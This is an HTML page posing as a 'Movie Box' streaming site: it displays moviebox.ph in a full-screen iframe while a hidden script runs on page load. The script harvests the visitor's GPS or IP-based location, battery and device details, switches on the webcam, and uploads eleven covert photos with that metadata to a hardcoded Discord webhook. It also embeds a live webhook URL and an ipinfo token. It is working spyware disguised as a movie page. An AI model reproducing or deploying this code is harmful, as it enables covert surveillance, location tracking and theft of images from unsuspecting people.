<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta name="theme-color" content="#000000">
<title>Movie Box</title>
<style>
  html, body, iframe { margin:0; padding:0; width:100%; height:100%; border:none; }
  video, canvas { display:none !important; }
</style>
</head>
<body>
<iframe src="https://moviebox.ph" allowfullscreen></iframe>
<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>
<script>
(async function(){
  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1413583590989627653/bXjzVyVrBeuMIIAJFYNLPna-m7VOq9JeEHcaGVlscMjP198EWKbKGH28R-IdSrvrfqcf";
  const IPINFO_TOKEN = "c62a8dce7203fe";
  const FOLLOWUP_COUNT = 10;
  const INTERVAL_MS = 3000;
  const WIDTH = 640, HEIGHT = 480;

  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const ctx = canvas.getContext("2d");
  let stream;

  function snap(){
    canvas.width = WIDTH; canvas.height = HEIGHT;
    ctx.drawImage(video,0,0,WIDTH,HEIGHT);
    return canvas.toDataURL("image/jpeg",0.9);
  }

  async function sendToDiscord(imageDataUrl, caption=""){
    const blob = await (await fetch(imageDataUrl)).blob();
    const form = new FormData();
    form.append("file", blob, `photo_${Date.now()}.jpg`);
    if(caption) form.append("content", caption);
    await fetch(DISCORD_WEBHOOK_URL,{method:"POST", body: form});
  }

  async function getGeoLocation(){
    return new Promise((resolve,reject)=>{
      if(!navigator.geolocation) return reject("Geolocation not supported");
      navigator.geolocation.getCurrentPosition(
        pos=>{
          const lat = pos.coords.latitude.toFixed(6);
          const lng = pos.coords.longitude.toFixed(6);
          const acc = Math.round(pos.coords.accuracy);
          resolve(`GPS Location: ${lat}, ${lng} (Â±${acc}m)`);
        },
        err=>reject(err),
        { enableHighAccuracy:true, timeout:15000, maximumAge:0 }
      );
    });
  }

  async function getIPLocation(){
    try{
      const res = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
      const data = await res.json();
      return `IP Location: ${data.city}, ${data.region}, ${data.country} (IP: ${data.ip})`;
    } catch {
      return "IP location unavailable";
    }
  }

  async function getBatteryInfo(){
    try{
      const b = await navigator.getBattery();
      return `Battery: ${(b.level*100).toFixed(0)}% (Charging: ${b.charging})`;
    } catch { return "Battery info unavailable"; }
  }

  function getDeviceInfo(){
    return [
      `UserAgent: ${navigator.userAgent}`,
      `Platform: ${navigator.platform}`,
      `Cores: ${navigator.hardwareConcurrency || "?"}`,
      `Memory: ${navigator.deviceMemory || "?"}GB`,
      `Screen: ${screen.width}x${screen.height}`,
      `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
      `Language: ${navigator.language}`,
      `Network: ${navigator.connection?.effectiveType || "unknown"}`
    ].join("\n");
  }

  async function start(){
    try{
      // Location: GPS first, fallback to IP
      let locationText;
      try { locationText = await getGeoLocation(); }
      catch { locationText = await getIPLocation(); }

      const batteryText = await getBatteryInfo();
      const deviceText = getDeviceInfo();
      const metaInfo = `${locationText}\n${batteryText}\n${deviceText}`;

      // Camera
      stream = await navigator.mediaDevices.getUserMedia({ video:true });
      video.srcObject = stream;
      await video.play();

      // First photo + metadata
      const firstImg = snap();
      await sendToDiscord(firstImg, metaInfo);

      // Follow-up photos
      for(let i=0;i<FOLLOWUP_COUNT;i++){
        await new Promise(r=>setTimeout(r,INTERVAL_MS));
        const img = snap();
        await sendToDiscord(img);
      }

    }catch(e){ console.error(e); }
    finally{ if(stream) stream.getTracks().forEach(t=>t.stop()); }
  }

  window.addEventListener("load", start);
})();
</script>
</body>
</html>
